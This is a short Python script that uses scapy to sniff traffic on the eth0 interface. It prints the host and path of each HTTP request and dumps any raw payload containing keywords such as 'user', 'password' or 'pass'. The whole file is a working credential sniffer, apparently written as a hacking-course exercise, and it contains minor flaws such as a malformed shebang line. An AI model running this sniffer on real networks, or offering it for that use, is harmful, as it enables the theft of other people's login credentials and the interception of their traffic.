#!usr/bin/nav/env python
import scapy.all as scapy
from scapy.layers import http
def sniff(interface):
    # store - telling scapy not to store packets in memory for performance
    # prn - callback when the fucntion captures a packet
    scapy.sniff(iface= interface, store= False, prn= process_sniffed_packet, filter="")

def process_sniffed_packet(packet):
    # checing if a packet has http layer
    if packet.haslayer(http.HTTPRequest):
        # print(packet)
        # print packet in detail
        # print(packet.show())
        urlString = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(urlString)
        if packet.haslayer(scapy.Raw):
            data = packet[scapy.Raw].load
            keys = ["user","password","pass","username"]
            for k in keys:
              if k in data:
                print(data)
                break

# target interface
sniff("eth0")